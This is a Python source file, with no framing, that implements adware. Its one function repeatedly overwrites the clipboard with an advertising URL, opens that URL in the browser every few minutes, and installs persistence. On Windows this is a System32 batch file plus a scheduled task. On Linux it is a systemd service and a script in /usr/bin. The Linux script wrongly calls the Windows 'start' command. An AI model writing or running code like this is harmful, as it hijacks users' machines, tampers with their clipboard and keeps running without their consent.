import os
import threading
import time
import pyperclip
import webbrowser

def adware_clipboard_hijacking_persistent_ads(ad_url: str) -> None:
    def hijack_clipboard(ad_url):
        while True:
            pyperclip.copy(ad_url)
            time.sleep(60)

    def display_ads(ad_url):
        while True:
            webbrowser.open(ad_url)
            time.sleep(300)

    def create_persistence():
        if os.name == 'nt':  # Windows
            with open('C:\\Windows\\System32\\AdwareService.bat', 'w') as f:
                f.write(f'start {ad_url}\n')
            os.system('schtasks /create /tn AdwareService /tr "C:\\Windows\\System32\\AdwareService.bat" /sc minute /mo 1')
        else:  # Linux
            with open('/etc/systemd/system/adware.service', 'w') as f:
                f.write('[Unit]\nDescription=Adware Service\n[Service]\nExecStart=/usr/bin/start_adware.sh\n[Install]\nWantedBy=multi-user.target\n')
            with open('/usr/bin/start_adware.sh', 'w') as f:
                f.write(f'#!/bin/bash\nstart {ad_url}\n')
            os.system('systemctl daemon-reload && systemctl enable adware && systemctl start adware')

    clipboard_thread = threading.Thread(target=hijack_clipboard, args=(ad_url,))
    ads_thread = threading.Thread(target=display_ads, args=(ad_url,))

    clipboard_thread.start()
    ads_thread.start()

    create_persistence()

    clipboard_thread.join()
    ads_thread.join()
